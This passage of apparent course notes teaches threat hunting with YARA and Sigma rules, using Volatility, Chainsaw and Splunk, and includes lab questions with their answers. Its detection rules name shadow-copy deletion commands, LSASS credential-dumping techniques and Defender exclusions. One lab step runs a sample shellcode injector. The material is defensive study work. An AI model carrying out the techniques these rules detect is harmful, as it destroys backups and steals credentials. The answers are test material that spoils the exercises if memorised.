  description = &quot;Generic detection for samples that enumerate files with encrypted resource called 101&quot;
  reference = &quot;https://securelist.com/from-shamoon-to-stonedrill/77725/&quot;
  hash = &quot;2cd0a5f1e9bcce6807e57ec8477d222a&quot;
  hash = &quot;c843046e54b755ec63ccb09d0a689674&quot;
  version = &quot;1.4&quot;
strings:
  $mz = &quot;This program cannot be run in DOS mode.&quot;
  $a1 = &quot;FindFirstFile&quot; ascii wide nocase
  $a2 = &quot;FindNextFile&quot; ascii wide nocase
  $a3 = &quot;FindResource&quot; ascii wide nocase
  $a4 = &quot;LoadResource&quot; ascii wide nocase

condition:
uint16(0) == 0x5A4D and
all of them and
filesize &lt; 700000 and
pe.number_of_sections &gt; 4 and
pe.number_of_signatures == 0 and
pe.number_of_resources &gt; 1 and pe.number_of_resources &lt; 15 and for any i in (0..pe.number_of_resources - 1):
( (math.entropy(pe.resources[i].offset, pe.resources[i].length) &gt; 7.8) and pe.resources[i].id == 101 and
pe.resources[i].length &gt; 20000 and
pe.resources[i].language == 0 and
not ($mz in (pe.resources[i].offset..pe.resources[i].offset + pe.resources[i].length))
)
}
</code></pre>
<p><a href="https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/">How to Write Simple but Sound Yara Rules - Part 1</a></p>
<p><a href="https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/">How to Write Simple but Sound Yara Rules - Part 2</a></p>
<p><a href="https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/">How to Write Simple but Sound Yara Rules - Part 3</a></p>
<h4 id="hunting-evil-with-yara-windows-edition">Hunting Evil with YARA (Windows Edition)</h4>
<p><strong>Hunting for Malicious Executables on Disk with YARA</strong></p>
<pre><code class="language-sh">$ hexdump dharma_sample.exe -C | grep crysis -n3

$ hexdump dharma_sample.exe -C | grep sssssbsss -n3

yara64.exe -s C:\Rules\yara\dharma_ransomware.yar C:\Samples\YARASigma\ -r 2&gt;null
</code></pre>
<p><strong>Hunting for Evil Within Running Processes with YARA</strong></p>
<p>YARA Rule Source: https://github.com/cuckoosandbox/community/blob/master/data/yara/shellcode/metasploit.yar</p>
<pre><code class="language-powershell"># execute the injection
.\htb_sample_shell.exe

Get-Process | ForEach-Object { &quot;Scanning with Yara for meterpreter shellcode on PID &quot;+$_.id; &amp; &quot;yara64.exe&quot; &quot;C:\Rules\yara\meterpreter_shellcode.yar&quot; $_.id }

yara64.exe C:\Rules\yara\meterpreter_shellcode.yar 9084 --print-strings
</code></pre>
<p><strong>Hunting for Evil Within ETW Data with YARA</strong></p>
<p>Event Tracing For Windows (ETW) </p>
<p><strong>YARA Rule Scanning on ETW (Using SilkETW)</strong></p>
<pre><code class="language-powershell">.\SilkETW.exe -h

# Example 1: YARA Rule Scanning on Microsoft-Windows-PowerShell ETW Data
.\SilkETW.exe -t user -pn Microsoft-Windows-PowerShell -ot file -p ./etw_ps_logs.json -l verbose -y C:\Rules\yara  -yo Matches

Invoke-Command -ScriptBlock {Write-Host &quot;Hello from PowerShell&quot;}

# Example 2: YARA Rule Scanning on Microsoft-Windows-DNS-Client ETW Data
.\SilkETW.exe -t user -pn Microsoft-Windows-DNS-Client -ot file -p ./etw_dns_logs.json -l verbose -y C:\Rules\yara  -yo Matches

ping iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
</code></pre>
<h4 id="hunting-evil-with-yara-linux-edition">Hunting Evil with YARA (Linux Edition)</h4>
<p>Even if we can't access the machine, in many cases, a memory capture (or memory dump) from the suspicious system can be handed over to us in the Security Operations Center (SOC). It's akin to receiving a snapshot of everything happening in the system at a particular moment. </p>
<p><strong>Hunting for Evil Within Memory Images with YARA</strong></p>
<ul>
<li>
<p>Create YARA Rules: Either develop bespoke YARA rules or lean on existing ones that target memory-based malware traits or dubious behaviors.</p>
</li>
<li>
<p>Compile YARA Rules: Compile the YARA rules into a binary format using the yarac tool (YARA Compiler). This step creates a file containing the compiled YARA rules with a .yrc extension. This step is optional, as we can use the normal rules in text format as well.</p>
</li>
<li>
<p>Obtain Memory Image: Capture a memory image using tools such as DumpIt, MemDump, Belkasoft RAM Capturer, Magnet RAM Capture, FTK Imager, and LiME (Linux Memory Extractor).</p>
</li>
<li>
<p>Memory Image Scanning with YARA: Use the yara tool and the compiled YARA rules to scan the memory image for possible matches.</p>
</li>
</ul>
<pre><code class="language-sh">$ yara /home/htb-student/Rules/yara/wannacry_artifacts_memory.yar /home/htb-student/MemoryDumps/compromised_system.raw --print-strings

# Single Pattern YARA Scanning Against a Memory Image
$ vol.py -f /home/htb-student/MemoryDumps/compromised_system.raw yarascan -U &quot;www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com&quot;

# Multiple YARA Rule Scanning Against a Memory Image
$ vol.py -f /home/htb-student/MemoryDumps/compromised_system.raw yarascan -y /home/htb-student/Rules/yara/wannacry_artifacts_memory.yar
</code></pre>
<p>the <code>-U</code> option allows us to directly specify a YARA rule string within the command-line, while the <code>-y</code> option is used to specify the path to a file containing one or more YARA rules.</p>
<p><strong>Q:</strong> Study the following resource https://blogs.vmware.com/security/2022/09/threat-report-illuminating-volume-shadow-deletion.html to learn how WannaCry performs shadow volume deletion. Then, use yarascan when analyzing "/home/htb-student/MemoryDumps/compromised_system.raw" to identify the process responsible for deleting shadows. Enter the name of the process as your answer.</p>
<pre><code class="language-sh">$ /usr/local/bin/vol.py -f /home/htb-student/MemoryDumps/compromised_system.raw yarascan -U &quot;vssadmin&quot;
````
![alt text](assets/image28.png)

`@WanaDecryptor@` 

OR

```sh
# yara rule
rule ShadowVolumeDeletion
{
    meta:
        description = &quot;Detects shadow volume deletion activities&quot;
        author = &quot;Ying Bai&quot;
        last_modified = &quot;2025-01-20&quot;

    strings:
        $vssadmin_delete = &quot;vssadmin delete shadows&quot;
        $vssadmin_delete_all = &quot;vssadmin delete shadows /all&quot;
        $wmic_shadow_delete = &quot;wmic shadowcopy delete&quot;
        $wmic_shadow_delete_all = &quot;wmic shadowcopy delete /all&quot;
        $cmd_args = &quot;-delete&quot;

    condition:
        any of ($vssadmin_delete, $vssadmin_delete_all, $wmic_shadow_delete, $wmic_shadow_delete_all) or
        any of ($cmd_args)
}

$ /usr/local/bin/vol.py -f /home/htb-student/MemoryDumps/compromised_system.raw yarascan -y /home/htb-student/Rules/yara/shadow_volume_deletion.yar
</code></pre>
<h4 id="hunting-evil-with-yara-web-edition">Hunting Evil with YARA (Web Edition)</h4>
<p><strong>Hunting for Evil Within Online Datasets with YARA</strong></p>
<p>Test yara rules</p>
<p><a href="https://www.unpac.me/yara/editor">Yara Hunt</a></p>
<p><img alt="alt text" src="../assets/image29.png" /></p>
<h4 id="sigma-and-sigma-rules">Sigma and Sigma Rules</h4>
<p>Sigma is a generic signature format used for describing detection rules for log analysis and SIEM systems. Sigma rules are typically written in <code>YAML</code> format and can be used with various security tools and platforms.</p>
<p><a href="https://github.com/SigmaHQ/pySigma">pySigma</a> is increasingly becoming the go-to option for rule translation, as sigmac is now considered obsolete.</p>
<p><strong>Sigma Rule Structure:</strong></p>
<p><img alt="alt text" src="../assets/image30.png" /></p>
<p><img alt="alt text" src="../assets/image31.png" /></p>
<p>log source guide: https://github.com/SigmaHQ/sigma/tree/master/documentation/logsource-guides</p>
<p><a href="https://github.com/SigmaHQ/sigma/wiki/Rule-Creation-Guide">Sigma's Rule Creation Guide</a></p>
<h4 id="developing-sigma-rules">Developing Sigma Rules</h4>
<p><strong>Manually Developing a Sigma Rule</strong></p>
<p><strong>Example 1: LSASS Credential Dumping</strong></p>
<pre><code class="language-yaml"># sigma rule
title: LSASS Access with rare GrantedAccess flag 
status: experimental
description: This rule will detect when a process tries to access LSASS memory with suspicious access flag 0x1010
date: 2023/07/08
tags:
    - attack.credential_access
    - attack.t1003.001
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
        GrantedAccess|endswith: '0x1010'
    condition: selection
</code></pre>
<p><code>0x1010</code> hexadecimal flag essentially combines PROCESS_VM_READ (<code>0x0010</code>) and PROCESS_QUERY_INFORMATION (<code>0x0400</code>) permissions. To translate that: the process is asking for read access to the virtual memory of LSASS and the ability to query certain information from the process. While <code>0x0410</code> is the most common GrantedAccess flag used for reading LSASS memory, <code>0x1010</code> implies both reading and querying information from the process and is also frequently observed during credential dumping attacks.</p>
<p>The condition part specifies that the selection criteria must be met for the rule to trigger an alert. In this case, both the <code>TargetImage</code> and <code>GrantedAccess</code> criteria must be met.</p>
<pre><code class="language-powershell">python sigmac -t powershell 'C:\Rules\sigma\proc_access_win_lsass_access.yml'
Get-WinEvent | where {($_.ID -eq &quot;10&quot; -and $_.message -match &quot;TargetImage.*.*\\lsass.exe&quot; -and $_.message -match &quot;GrantedAccess.*.*0x1010&quot;) } | select TimeCreated,Id,RecordId,ProcessId,MachineName,Message

Get-WinEvent -Path C:\Events\YARASigma\lab_events.evtx | where {($_.ID -eq &quot;10&quot; -and $_.message -match &quot;TargetImage.*.*\\lsass.exe&quot; -and $_.message -match &quot;GrantedAccess.*.*0x1010&quot;) } | select TimeCreated,Id,RecordId,ProcessId,MachineName,Message
</code></pre>
<p>But let's not stop there - remember, false positives are the enemy of effective security monitoring.</p>
<p>We should also cross-reference the SourceImage (the process initiating the access) against a list of known, safe processes that commonly interact with LSASS.</p>
<p>If we see an unfamiliar or unusual process trying to read LSASS with a GrantedAccess that ends with 10, 30, 50, 70, 90, B0, D0, F0, 18, 38, 58, 78, 98, B8, D8, F8, 1A, 3A, 5A, 7A, 9A, BA, DA, FA, 0x14C2, and FF (these suffixes come from studying the GrantedAccess values that various LSASS credential dumping techniques require), that's a red flag, and our incident response protocol should kick in.</p>
<p>Especially, if the SourceImage resides in suspicious paths containing, <code>\Temp\</code>, <code>\Users\Public\</code>, <code>\PerfLogs\</code>, <code>\AppData\</code>, <code>\htb\</code> etc. that's another red flag, and our incident response protocol should kick in.</p>
<p>A more robust version of the Sigma rule we created taking the above points into consideration can be found inside the <code>C:\Rules\sigma</code> directory of this section's target as <code>proc_access_win_lsass_access_robust.yml</code></p>
<pre><code class="language-yaml">title: LSASS Access From Program in Potentially Suspicious Folder
id: fa34b441-961a-42fa-a100-ecc28c886725
status: experimental
description: Detects process access to LSASS memory with suspicious access flags and from a potentially suspicious folder
references:
    - https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
    - https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843&amp;ithint=file%2cpptx&amp;app=PowerPoint&amp;authkey=!AMvCRTKB_V1J5ow
    - https://web.archive.org/web/20230208123920/https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html
    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment
    - http://security-research.dyndns.org/pub/slides/FIRST2017/FIRST-2017_Tom-Ueltschi_Sysmon_FINAL_notes.pdf
author: Florian Roth (Nextron Systems)
date: 2021/11/27
modified: 2023/05/05
tags:
    - attack.credential_access
    - attack.t1003.001
    - attack.s0002
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
        GrantedAccess|endswith:
            - '10'
            - '30'
            - '50'
            - '70'
            - '90'
            - 'B0'
            - 'D0'
            - 'F0'
            - '18'
            - '38'
            - '58'
            - '78'
            - '98'
            - 'B8'
            - 'D8'
            - 'F8'
            - '1A'
            - '3A'
            - '5A'
            - '7A'
            - '9A'
            - 'BA'
            - 'DA'
            - 'FA'
            - '0x14C2'  # https://github.com/b4rtik/ATPMiniDump/blob/76304f93b390af3bb66e4f451ca16562a479bdc9/ATPMiniDump/ATPMiniDump.c
            - 'FF'
        SourceImage|contains:
            - '\Temp\'
            - '\Users\Public\'
            - '\PerfLogs\'
            - '\AppData\'
            - '\htb\'
    filter_optional_generic_appdata:
        SourceImage|startswith: 'C:\Users\'
        SourceImage|contains: '\AppData\Local\'
        SourceImage|endswith:
            - '\Microsoft VS Code\Code.exe'
            - '\software_reporter_tool.exe'
            - '\DropboxUpdate.exe'
            - '\MBAMInstallerService.exe'
            - '\WebexMTA.exe'
            - '\WebEx\WebexHost.exe'
            - '\JetBrains\Toolbox\bin\jetbrains-toolbox.exe'
        GrantedAccess: '0x410'
    filter_optional_dropbox_1:
        SourceImage|startswith: 'C:\Windows\Temp\'
        SourceImage|endswith: '.tmp\DropboxUpdate.exe'
        GrantedAccess:
            - '0x410'
            - '0x1410'
    filter_optional_dropbox_2:
        SourceImage|startswith: 'C:\Users\'
        SourceImage|contains: '\AppData\Local\Temp\'
        SourceImage|endswith: '.tmp\DropboxUpdate.exe'
        GrantedAccess: '0x1410'
    filter_optional_dropbox_3:
        SourceImage|startswith:
            - 'C:\Program Files (x86)\Dropbox\'
            - 'C:\Program Files\Dropbox\'
        SourceImage|endswith: '\DropboxUpdate.exe'
        GrantedAccess: '0x1410'
    filter_optional_nextron:
        SourceImage|startswith:
            - 'C:\Windows\Temp\asgard2-agent\'
            - 'C:\Windows\Temp\asgard2-agent-sc\'
        SourceImage|endswith:
            - '\thor64.exe'
            - '\thor.exe'
            - '\aurora-agent-64.exe'
            - '\aurora-agent.exe'
        GrantedAccess:
            - '0x1fffff'
            - '0x1010'
            - '0x101010'
    filter_optional_ms_products:
        SourceImage|startswith: 'C:\Users\'
        SourceImage|contains|all:
            - '\AppData\Local\Temp\'
            - '\vs_bootstrapper_'
        GrantedAccess: '0x1410'
    filter_optional_chrome_update:
        SourceImage|startswith: 'C:\Program Files (x86)\Google\Temp\'
        SourceImage|endswith: '.tmp\GoogleUpdate.exe'
        GrantedAccess:
            - '0x410'
            - '0x1410'
    filter_optional_keybase:
        SourceImage|startswith: 'C:\Users\'
        SourceImage|endswith: \AppData\Local\Keybase\keybase.exe
        GrantedAccess: '0x1fffff'
    filter_optional_avira:
        SourceImage|contains: '\AppData\Local\Temp\is-'
        SourceImage|endswith: '.tmp\avira_system_speedup.tmp'
        GrantedAccess: '0x1410'
    filter_optional_viberpc_updater:
        SourceImage|startswith: 'C:\Users\'
        SourceImage|contains: '\AppData\Roaming\ViberPC\'
        SourceImage|endswith: '\updater.exe'
        TargetImage|endswith: '\winlogon.exe'
        GrantedAccess: '0x1fffff'
    filter_optional_adobe_arm_helper:
        SourceImage|startswith:  # Example path: 'C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\Temp\2092867405\AdobeARMHelper.exe'
            - 'C:\Program Files\Common Files\Adobe\ARM\'
            - 'C:\Program Files (x86)\Common Files\Adobe\ARM\'
        SourceImage|endswith: '\AdobeARMHelper.exe'
        GrantedAccess: '0x1410'
    condition: selection and not 1 of filter_optional_*
fields:
    - User
    - SourceImage
    - GrantedAccess
falsepositives:
    - Updaters and installers are typical false positives. Apply custom filters depending on your environment
level: medium
</code></pre>
<p>Notice how the condition filters out false positives (selection <code>and not 1 of filter_optional_*</code>).</p>
<p><strong>Example 2: Multiple Failed Logins From Single Source (Based on Event 4776)</strong></p>
<pre><code class="language-yaml">title: Failed NTLM Logins with Different Accounts from Single Source System
id: 6309ffc4-8fa2-47cf-96b8-a2f72e58e538
related:
    - id: e98374a6-e2d9-4076-9b5c-11bdb2569995
      type: derived
status: unsupported
description: Detects suspicious failed logins with different user accounts from a single source system
author: Florian Roth (Nextron Systems)
date: 2017/01/10
modified: 2023/02/24
tags:
    - attack.persistence
    - attack.privilege_escalation
    - attack.t1078
logsource:
    product: windows
    service: security
detection:
    selection2:
        EventID: 4776
        TargetUserName: '*'
        Workstation: '*'
    condition: selection2 | count(TargetUserName) by Workstation &gt; 3
falsepositives:
    - Terminal servers
    - Jump servers
    - Other multiuser systems like Citrix server farms
    - Workstations with frequently changing users
level: medium
</code></pre>
<p><strong>Sigma Rule Development Resources</strong></p>
<p>As you can imagine, the best Sigma rule development resource is the official documentation, which can be found at the following links.</p>
<p>https://github.com/SigmaHQ/sigma/wiki/Rule-Creation-Guide
https://github.com/SigmaHQ/sigma-specification</p>
<p>The following series of articles is the next best resource on Sigma rule developement.</p>
<p>https://tech-en.netlify.app/articles/en510480/
https://tech-en.netlify.app/articles/en513032/
https://tech-en.netlify.app/articles/en515532/</p>
<p><strong>Q:</strong> Using sigmac translate the "C:\Tools\chainsaw\sigma\rules\windows\builtin\windefend\win_defender_threat.yml" Sigma rule into the equivalent PowerShell command. Then, execute the PowerShell command against "C:\Events\YARASigma\lab_events_4.evtx" and enter the malicious driver as your answer. Answer format: _.sys</p>
<pre><code class="language-powershell">PS C:\Tools\sigma-0.21\tools&gt; python sigmac -t powershell 'C:\Tools\chainsaw\sigma\rules\windows\builtin\windefend\win_defender_threat.yml'
Get-WinEvent | where {($_.ID -eq &quot;1006&quot; -or $_.ID -eq &quot;1116&quot; -or $_.ID -eq &quot;1015&quot; -or $_.ID -eq &quot;1117&quot;) } | select TimeCreated,Id,RecordId,ProcessId,MachineName,Message

Get-WinEvent -Path C:\Events\YARASigma\lab_events_4.evtx | where {($_.ID -eq &quot;1006&quot; -or $_.ID -eq &quot;1116&quot; -or $_.ID -eq &quot;1015&quot; -or $_.ID -eq &quot;1117&quot;) } | select TimeCreated,Id,RecordId,ProcessId,MachineName,Message
</code></pre>
<h4 id="hunting-evil-with-sigma-chainsaw-edition">Hunting Evil with Sigma (Chainsaw Edition)</h4>
<p>Sigma rules combined with tools like <a href="https://github.com/WithSecureLabs/chainsaw">Chainsaw</a> and <a href="https://github.com/wagga40/Zircolite">Zircolite</a> are our best allies.</p>
<p><strong>Scanning Windows Event Logs With Chainsaw</strong></p>
<p>Using the <code>-s</code> parameter, we can specify a directory containing Sigma detection rules (or one Sigma detection rule) and Chainsaw will automatically load, convert and run these rules against the provided event logs. The mapping file (specified through the<code>--mapping</code> parameter) tells Chainsaw which fields in the event logs to use for rule matching.</p>
<pre><code class="language-powershell">PS C:\Tools\chainsaw&gt; .\chainsaw_x86_64-pc-windows-msvc.exe -h

# Example 1: Hunting for Multiple Failed Logins From Single Source With Sigma
&gt; .\chainsaw_x86_64-pc-windows-msvc.exe hunt C:\Events\YARASigma\lab_events_2.evtx -s C:\Rules\sigma\win_security_susp_failed_logons_single_source2.yml --mapping .\mappings\sigma-event-logs-all.yml
</code></pre>
<p><strong>Example 2: Hunting for Abnormal PowerShell Command Line Size With Sigma (Based on Event ID 4688)</strong></p>
<pre><code class="language-yaml"># proc_creation_win_powershell_abnormal_commandline_size.yml
title: Unusually Long PowerShell CommandLine
id: d0d28567-4b9a-45e2-8bbc-fb1b66a1f7f6
status: test
description: Detects unusually long PowerShell command lines with a length of 1000 characters or more
references:
    - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse
author: oscd.community, Natalia Shornikova / HTB Academy, Dimitrios Bougioukas
date: 2020/10/06
modified: 2023/04/14
tags:
    - attack.execution
    - attack.t1059.001
    - detection.threat_hunting
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        EventID: 4688
        NewProcessName|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
    selection_powershell:
        CommandLine|contains:
            - 'powershell.exe'
            - 'pwsh.exe'
    selection_length:        
        CommandLine|re: '.{1000,}'
    condition: selection and selection_powershell and selection_length
falsepositives:
    - Unknown
level: low
</code></pre>
<pre><code class="language-powershell">.\chainsaw_x86_64-pc-windows-msvc.exe hunt C:\Events\YARASigma\lab_events_3.evtx -s C:\Rules\sigma\proc_creation_win_powershell_abnormal_commandline_size.yml --mapping .\mappings\sigma-event-logs-all.yml

#  introduced the NewProcessName field into a sigma-event-logs-all-new.yml mapping file inside the C:\Tools\chainsaw\mappings directory of this section's target.
.\chainsaw_x86_64-pc-windows-msvc.exe hunt C:\Events\YARASigma\lab_events_3.evtx -s C:\Rules\sigma\proc_creation_win_powershell_abnormal_commandline_size.yml --mapping .\mappings\sigma-event-logs-all-new.yml
</code></pre>
<pre><code class="language-yaml">........
groups:
  - name: Sigma
    timestamp: Event.System.TimeCreated
    filter:
      Provider: &quot;*&quot;
    fields:
    ..............
      - from: NewProcessName
        to: Event.EventData.NewProcessName
        visible: false
    ...............
</code></pre>
<p><strong>Q:</strong> Use Chainsaw with the "C:\Tools\chainsaw\sigma\rules\windows\powershell\powershell_script\posh_ps_win_defender_exclusions_added.yml" Sigma rule to hunt for suspicious Defender exclusions inside "C:\Events\YARASigma\lab_events_5.evtx". Enter the excluded directory as your answer.</p>
<pre><code class="language-yaml"># posh_ps_win_defender_exclusions_added.yml
title: Windows Defender Exclusions Added - PowerShell
id: c1344fa2-323b-4d2e-9176-84b4d4821c88
related:
    - id: 17769c90-230e-488b-a463-e05c08e9d48f
      type: similar
status: experimental
description: Detects modifications to the Windows Defender configuration settings using PowerShell to add exclusions
references:
    - https://www.elastic.co/guide/en/security/current/windows-defender-exclusions-added-via-powershell.html
author: Tim Rauch
date: 2022/09/16
modified: 2022/11/26
tags:
    - attack.defense_evasion
    - attack.t1562
    - attack.execution
    - attack.t1059
logsource:
    category: ps_script
    product: windows
    definition: 'Requirements: Script Block Logging must be enabled'
detection:
    selection_args_exc:
        ScriptBlockText|contains:
            - ' -ExclusionPath '
            - ' -ExclusionExtension '
            - ' -ExclusionProcess '
            - ' -ExclusionIpAddress '
    selection_args_pref:
        ScriptBlockText|contains:
            - 'Add-MpPreference '
            - 'Set-MpPreference '
    condition: all of selection*
falsepositives:
    - Unknown
level: medium
</code></pre>
<pre><code class="language-powershell">.\chainsaw_x86_64-pc-windows-msvc.exe hunt C:\Events\YARASigma\lab_events_5.evtx -s C:\Tools\chainsaw\sigma\rules\windows\powershell\powershell_script\posh_ps_win_defender_exclusions_added.yml --mapping .\mappings\sigma-event-logs-all-new.yml

c:\document\virus\
</code></pre>
<p><img alt="alt text" src="../assets/image32.png" /></p>
<h4 id="hunting-evil-with-sigma-splunk-edition">Hunting Evil with Sigma (Splunk Edition)</h4>
<p><strong>Example 1: Hunting for MiniDump Function Abuse to Dump LSASS's Memory (comsvcs.dll via rundll32)</strong></p>
<pre><code class="language-yaml"># proc_access_win_lsass_dump_comsvcs_dll.yml
title: Lsass Memory Dump via Comsvcs DLL
id: a49fa4d5-11db-418c-8473-1e014a8dd462
status: test
description: Detects adversaries leveraging the MiniDump export function from comsvcs.dll via rundll32 to perform a memory dump from lsass.
references:
    - https://twitter.com/shantanukhande/status/1229348874298388484
    - https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)
date: 2020/10/20
modified: 2022/10/09
tags:
    - attack.credential_access
    - attack.t1003.001
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
        SourceImage: 'C:\Windows\System32\rundll32.exe'
        CallTrace|contains: 'comsvcs.dll'
    condition: selection
falsepositives:
    - Unknown
level: critical
</code></pre>
<pre><code class="language-powershell">PS C:\Tools\sigma-0.21\tools&gt; python sigmac -t splunk C:\Tools\chainsaw\sigma\rules\windows\process_access\proc_access_win_lsass_dump_comsvcs_dll.yml -c .\config\splunk-windows.yml

(TargetImage=&quot;*\\lsass.exe&quot; SourceImage=&quot;C:\\Windows\\System32\\rundll32.exe&quot; CallTrace=&quot;*comsvcs.dll*&quot;)
</code></pre>
<p><img alt="alt text" src="../assets/image33.png" /></p>
<p><strong>Example 2: Hunting for Notepad Spawning Suspicious Child Process</strong></p>
<pre><code class="language-yaml"># proc_creation_win_notepad_susp_child.yml
title: Notepad Calling Suspicious Child Process
id: dcddc6ad-dbfb-40eb-82ca-d431a52e99bf
status: experimental
description: Detects notepad.exe spawning a suspicious child process
author: Dimitrios Bougioukas
date: 2023/31/08
modified: 2023/31/08
tags:
    - attack.defense_evasion
    - attack.t1036
    - attack.t1218
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith: '\notepad.exe'
        Image|endswith:
            # Add more suspicious LOLBins
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\mshta.exe'
            - '\cscript.exe'
            - '\wscript.exe'
            - '\taskkill.exe'
            - '\regsvr32.exe'
            - '\rundll32.exe'
            # - '\csc.exe'   # https://app.any.run/tasks/f420d295-0457-4e9b-9b9e-6732be227583/
            - '\calc.exe'  # https://app.any.run/tasks/f420d295-0457-4e9b-9b9e-6732be227583/
    condition: selection
falsepositives:
    - Unknown
level: high
</code></pre>
<pre><code class="language-powershell">python sigmac -t splunk C:\Rules\sigma\proc_creation_win_notepad_susp_child.yml -c .\config\splunk-windows.yml

(ParentImage=&quot;*\\notepad.exe&quot; (Image=&quot;*\\powershell.exe&quot; OR Image=&quot;*\\pwsh.exe&quot; OR Image=&quot;*\\cmd.exe&quot; OR Image=&quot;*\\mshta.exe&quot; OR Image=&quot;*\\cscript.exe&quot; OR Image=&quot;*\\wscript.exe&quot; OR Image=&quot;*\\taskkill.exe&quot; OR Image=&quot;*\\regsvr32.exe&quot; OR Image=&quot;*\\rundll32.exe&quot; OR Image=&quot;*\\calc.exe&quot;))
</code></pre>
<p><strong>Q:</strong> Using sigmac translate the "C:\Rules\sigma\file_event_win_app_dropping_archive.yml" Sigma rule into the equivalent Splunk search. Then, navigate to http://[Target IP]:8000, open the "Search &amp; Reporting" application, and submit the Splunk search sigmac provided. Enter the TargetFilename value of the returned event as your answer.</p>
<pre><code class="language-powershell">python sigmac -t splunk C:\Rules\sigma\file_event_win_app_dropping_archive.yml -c .\config\splunk-windows.yml

((Image=&quot;*\\winword.exe&quot; OR Image=&quot;*\\excel.exe&quot; OR Image=&quot;*\\powerpnt.exe&quot; OR Image=&quot;*\\msaccess.exe&quot; OR Image=&quot;*\\mspub.exe&quot; OR Image=&quot;*\\eqnedt32.exe&quot; OR Image=&quot;*\\visio.exe&quot; OR Image=&quot;*\\wordpad.exe&quot; OR Image=&quot;*\\wordview.exe&quot; OR Image=&quot;*\\certutil.exe&quot; OR Image=&quot;*\\certoc.exe&quot; OR Image=&quot;*\\CertReq.exe&quot; OR Image=&quot;*\\Desktopimgdownldr.exe&quot; OR Image=&quot;*\\esentutl.exe&quot; OR Image=&quot;*\\finger.exe&quot; OR Image=&quot;*\\notepad.exe&quot; OR Image=&quot;*\\AcroRd32.exe&quot; OR Image=&quot;*\\RdrCEF.exe&quot; OR Image=&quot;*\\mshta.exe&quot; OR Image=&quot;*\\hh.exe&quot; OR Image=&quot;*\\sharphound.exe&quot;) (TargetFilename=&quot;*.zip&quot; OR TargetFilename=&quot;*.rar&quot; OR TargetFilename=&quot;*.7z&quot; OR TargetFilename=&quot;*.diagcab&quot; OR TargetFilename=&quot;*.appx&quot;))
</code></pre>
<h4 id="skills-assessment_1">Skills Assessment</h4>
<p><strong>Q1:</strong> The "C:\Rules\yara\seatbelt.yar" YARA rule aims to detect instances of the "Seatbelt.exe" .NET assembly on disk. Analyze both "C:\Rules\yara\seatbelt.yar" and "C:\Samples\YARASigma\Seatbelt.exe" and specify the appropriate string inside the "$class2" variable so that the rule successfully identifies "C:\Samples\YARASigma\Seatbelt.exe". Answer format: L<strong><em>_</em></strong>_r</p>
<pre><code class="language-sh"># seatbelt.yar
rule seatbelt_detected {
 meta:
   description = &quot;Rule for detecting Seatbelt&quot;
   author = &quot;Dimitrios Bougioukas&quot;
 strings:
   $class1 = &quot;WMIUtil&quot;
   $class2 = &quot;LsaWrapper&quot;
   $class3 = &quot;SecurityUtil&quot;
   $class4 = &quot;MiscUtil&quot;
   $dotnetMagic = &quot;BSJB&quot; ascii
 condition:
   (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $dotnetMagic and 4 of them
}
</code></pre>
<p><img alt="alt text" src="../assets/image34.png" /></p>
<p><strong>Q2:</strong> Use Chainsaw with the "C:\Tools\chainsaw\sigma\rules\windows\powershell\powershell_script\posh_ps_susp_win32_shadowcopy.yml" Sigma rule to hunt for shadow volume deletion inside "C:\Events\YARASigma\lab_events_6.evtx". Enter the identified ScriptBlock ID as your answer.</p>
<pre><code class="language-yaml"># powershell_script\posh_ps_susp_win32_shadowcopy.yml
title: Delete Volume Shadow Copies via WMI with PowerShell - PS Script
id: e17121b4-ef2a-4418-8a59-12fb1631fa9e
status: test
description: Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject. This technique is used by numerous ransomware families such as Sodinokibi/REvil
references:
    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-5---windows---delete-volume-shadow-copies-via-wmi-with-powershell
author: frack113
date: 2021/12/26
modified: 2022/12/02
tags:
    - attack.impact
    - attack.t1490
logsource:
    product: windows
    category: ps_script
    definition: 'Requirements: Script Block Logging must be enabled'
detection:
    selection:
        ScriptBlockText|contains|all:
            - 'Get-WmiObject'
            - 'Win32_Shadowcopy'
            - '.Delete()'
    condition: selection
falsepositives:
    - Unknown
level: high
</code></pre>
<pre><code class="language-powershell">.\chainsaw_x86_64-pc-windows-msvc.exe hunt C:\Events\YARASigma\lab_events_6.evtx -s C:\Tools\chainsaw\sigma\rules\windows\powershell\powershell_script\posh_ps_susp_win32_shadowcopy.yml --mapping .\mappings\sigma-event-logs-all-new.yml
</code></pre>
<p><img alt="alt text" src="../assets/image35.png" /></p>
<h2 id="introduction-to-digital-forensics">Introduction to Digital Forensics</h2>
<p>The basic steps for performing a forensic investigation are as follows:</p>
<ol>
<li>
<p>Create a Forensic Image</p>
</li>
<li>
<p>Document the System's State</p>
</li>
<li>
<p>Identify and Preserve Evidence</p>
</li>
<li>
<p>Analyze the Evidence</p>
</li>
<li>
<p>Timeline Analysis</p>
</li>
<li>
<p>Identify Indicators of Compromise (IOCs)</p>
</li>
<li>
<p>Report and Documentation</p>
</li>
</ol>
